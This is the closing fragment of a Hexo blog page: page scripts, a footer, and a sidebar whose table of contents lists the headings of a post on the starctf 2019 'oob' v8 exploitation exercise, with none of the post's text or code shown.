    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#v8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0-starctf2019-oob"><span class="nav-number">1.</span> <span class="nav-text">v8漏洞练习笔记_starctf2019 oob</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#v8%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84"><span class="nav-number">1.0.0.0.1.</span> <span class="nav-text">v8内存结构</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#starctf-2019-oob"><span class="nav-number">1.0.0.0.2.</span> <span class="nav-text">starctf 2019 oob</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-number">1.0.0.0.3.</span> <span class="nav-text">实现任意地址读写</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87wasm%E6%89%A7%E8%A1%8Cshellcode"><span class="nav-number">1.0.0.0.4.</span> <span class="nav-text">通过wasm执行shellcode</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">1.0.0.0.5.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Ash</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ash</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
